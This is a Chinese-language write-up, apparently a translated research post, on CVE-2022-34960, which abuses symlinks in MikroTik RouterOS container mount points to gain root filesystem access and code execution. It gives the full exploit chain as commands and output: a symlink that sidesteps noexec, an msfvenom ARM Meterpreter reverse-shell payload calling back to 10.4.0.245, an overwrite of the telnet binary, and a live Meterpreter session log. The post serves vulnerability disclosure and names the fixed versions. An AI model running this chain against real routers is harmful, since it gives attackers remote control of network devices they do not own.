
# 符号链接作为挂载门户：滥用 MikroTik 的 RouterOS 上的容器挂载点来获取代码执行

**作者：nns**

> 道德黑客和网络安全专业人士，对硬件黑客、物联网和 Linux/GNU 特别感兴趣。

## 背景

RouterOS 版本 7.4beta4 为 MikroTik 设备引入了容器。该特性支持 ARM、ARM64 和 x86 架构。但是这个版本的容器中存在一个安全漏洞（CVE-2022-34960），该漏洞可能允许攻击者在主机设备上执行恶意代码。据报道，该漏洞影响了超过 90 万个设备。

## 挂载特性

MikroTik 文档表明可以在主机和容器之间创建挂载点。例如，`etc` 文件夹下的 `disk1` 被挂载到 `/etc/pihole` 容器中：

```bash
/container/mounts/add name=etc_pihole src=disk1/etc dst=/etc/pihole
```

这个特性造成了三个相当危险的特定行为。

### 1. 通过符号链接解析路径

例如，让我们采用以下目录结构：

```text
disk1/
├── dir1
│   ├── file1
│   └── file2
└── dir2/ --(symbolic link)--> dir1/
```

即使 `dir2` 是链接指向 `dir1` 的一个符号，但在 `disk1/dir2/file1` 上添加挂载点仍然是有效的，这意味着在文件挂载之前可以通过 `dir2` 解析到 `dir1`。

### 2. 符号链接是相对于主机设备的根目录解析的

假设我的容器的根文件系统存储在 `disk1/alpine` 中，我们在容器内执行以下操作：

```bash
# ln -s / /rootfs
```

那么在容器内，根目录将按 `/rootfs` 解析。如果在 RouterOS 中设置容器时将此目录用作挂载源，符号链接则将根据设备自己的文件系统进行解析。

例如，我将在容器 `/mnt` 目录中挂载主机文件系统：

```bash
/container/mounts/add name=rootfs src=/disk1/alpine/rootfs dst=/mnt
```

然后，从创建的容器内部就可以访问主机的根文件系统：

```text
# ls -l /mnt
total 0
drwxr-xr-x 2 nobody nobody 149 Jun 15 11:38 bin
drwxr-xr-x 9 nobody nobody 131 Jun 15 11:38 bndl
drwxr-xr-x 2 nobody nobody 3 Jun 15 11:38 boot
drwxr-xr-x 2 nobody nobody 3 Jun 15 11:38 dev
lrwxrwxrwx 1 nobody nobody 11 Jun 15 11:38 dude -> /flash/dude
drwxr-xr-x 2 nobody nobody 352 Jun 15 11:38 etc
drwxr-xr-x 2 nobody nobody 3 Jun 15 11:38 flash
drwxr-xr-x 3 nobody nobody 26 Jun 15 11:38 home
drwxr-xr-x 3 nobody nobody 403 Jun 15 11:38 lib
drwxr-xr-x 5 nobody nobody 73 Jun 15 11:38 nova
lrwxrwxrwx 1 nobody nobody 9 Jun 15 11:38 pckg -> /ram/pckg
drwxr-xr-x 2 nobody nobody 3 Jun 15 11:38 proc
drwxr-xr-x 2 nobody nobody 3 Jun 15 11:38 ram
lrwxrwxrwx 1 nobody nobody 9 Jun 15 11:38 rw -> /flash/rw
drwxr-xr-x 2 nobody nobody 45 Jun 15 11:38 sbin
drwxr-xr-x 2 nobody nobody 3 Jun 15 11:38 sys
lrwxrwxrwx 1 nobody nobody 7 Jun 15 11:38 tmp -> /rw/tmp
drwxr-xr-x 5 nobody nobody 111 Jun 15 11:38 var
```

### 3. 为 `src` 和 `dst` 参数解析符号链接

实际上，通过在参数中为 `rootfs` 使用符号链接，`dst` 可以将任意目录或文件从任何位置（甚至从容器内部）挂载到主机文件系统上的任何位置。

例如，我们创建一个挂载点，将容器内部的文件挂载到 webfig 目录，有效地“覆盖”现有的 `robots.txt`：

```bash
/container/mounts/add name=robots src=/disk1/alpine/robots.txt
dst=/rootfs/home/web/robots.txt
```

然后，在第三台机器上，我们使用 `curl` 命令验证它是否被覆盖：

```bash
$ curl router.lan/robots.txt
Hello from inside the container!
```

## 利用

Mount-what-where 是一个非常强大的原语。运行任意代码应该相对容易 - 只需挂载系统上预先存在的某些时候由设备执行的可执行文件。

但是，从 `/proc/mounts` 来看，由于挂载点的创建方式，这种方法不起作用：

```text
/dev/sda1 /nova/bin/telnet ext4 rw,nosuid,nodev,noexec,relatime 0 0
```

挂载点是使用 `nosuid`、`nodev` 和最重要的 `noexec` 选项创建的。这意味着即使您要挂载现有的二进制文件，它也不会被执行，而是每次都会失败并显示 "Permission denied"。so 共享库同样如此，因此挂载在 `.so` 文件上也是不可能的。

同时也没有发现任何允许运行代码的配置文件，这就是符号链接再次发挥作用的地方。

通过测试，如果一个文件系统上存在 `noexec` 属性的链接指向文件系统上有执行权限的二进制文件，那么该文件仍将被执行：

```bash
$ cp $(which id) id1
$ ln -s $(which id) id2
$ ./id1
bash: ./id1: Permission denied
$ ./id2
uid=1000(xx) gid=1000(xx) groups=1000(xx)
```

假设恶意程序可以从某个没有 `noexec` 标志的挂载点访问，我们就可以简单地将符号链接挂载到指向我们要运行的恶意二进制文件上。通过查看 `/proc/mounts`，我们可以看到容器自己的根文件系统实际上没有 `noexec` 标志（否则将无法在容器内运行可执行文件）：

```text
/dev/sda1 /flash/rw/container/aa10a963-9715-4c61-967c-7d9f993410e6/root ext4 rw,nosuid,nodev,relatime 0 0
```

这就是发起成功攻击所需的 `mount` 操作。我们可以用 `msfvenom` 生成一个攻击 payload：

```bash
msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=10.4.0.245 LPORT=1338 -f elf > rev
```

将它复制到容器中，并创建一个指向其可执行挂载点位置的符号链接：

```bash
ln -s /flash/rw/container/aa10a963-9715-4c61-967c-7d9f993410e6/root/rev /revlnk
```

由于 `telnet` 的优先级相对较低且易于触发和调试，我们将其作为目标二进制文件，再在 RouterOS 中创建挂载点：

```bash
/container/mounts/add name=telnet src=/disk1/alpine/revlnk dst=/rootfs/nova/bin/telnet
```

启动容器后，二进制文件 `/nova/bin/telnet` 被挂载，而且已经是一个指向我们恶意二进制文件的符号链接：

```text
/nova/bin/telnet -> /flash/rw/container/aa10a963-9715-4c61-967c-7d9f993410e6/root/rev
```

正如预期的那样，在设备上运行 `/system/telnet 127.0.0.1` 后，我们在 Meterpreter 监听器中建立了连接：

```text
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.4.0.245:1338
[*] Sending stage (908480 bytes) to 10.4.0.1
[*] Meterpreter session 1 opened (10.4.0.245:1338 -> 10.4.0.1:59434) at 2022-06-21 10:24:34 +0300

meterpreter > ls
Listing: /
==========

Mode             Size Type Last modified             Name
----             ---- ---- -------------             ----
040755/rwxr-xr-x 149   dir   2022-06-15 14:38:21 +0300 bin
040755/rwxr-xr-x 131   dir   2022-06-15 14:38:21 +0300 bndl
040755/rwxr-xr-x 3     dir   2022-06-15 14:38:21 +0300 boot
040755/rwxr-xr-x 6140 dir   2022-06-20 21:41:47 +0300 dev
                                                        dude
040755/rwxr-xr-x 352   dir   2022-06-15 14:38:21 +0300 etc
040755/rwxr-xr-x 1024 dir   2022-06-20 21:41:14 +0300 flash
040755/rwxr-xr-x 26   dir   2022-06-15 14:38:21 +0300 home
040755/rwxr-xr-x 403   dir   2022-06-15 14:38:21 +0300 lib
040755/rwxr-xr-x 73   dir   2022-06-15 14:38:21 +0300 nova
040755/rwxr-xr-x 200   dir   1970-01-01 03:00:12 +0300 pckg
040555/r-xr-xr-x 0     dir   1970-01-01 03:00:00 +0300 proc
041777/rwxrwxrwx 400   dir   2022-06-21 08:33:07 +0300 ram
040755/rwxr-xr-x 1024 dir   1970-01-01 03:00:14 +0300 rw
040755/rwxr-xr-x 45   dir   2022-06-15 14:38:21 +0300 sbin
040555/r-xr-xr-x 0     dir   1970-01-01 03:00:12 +0300 sys
040644/rw-r--r-- 1024 dir   1970-01-01 03:00:19 +0300 tmp
040755/rwxr-xr-x 111   dir   2022-06-15 14:38:21 +0300 var
```

这意味着我们可以在设备上成功执行任意代码。

该问题已在 RouterOS 版本 7.4beta5、7.4、7.5beta1 及更高版本中得到修复。

### 原文链接

<mark class="encrypted">6b0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6F1L8Y4y4Q4x3X3g2W2k6g2)9J5c8X3u0D9L8$3N6Q4x3V1j5J5x3o6t1J5i4K6u0r3x3o6S2Q4x3V1j5H3y4g2)9J5c8Y4u0G2N6i4c8W2M7X3!0K6i4K6u0V1j5$3!0F1N6r3q4A6L8X3g2J5i4K6u0V1M7X3y4W2i4K6u0W2K9s2c8E0L8l9`.`.</mark>
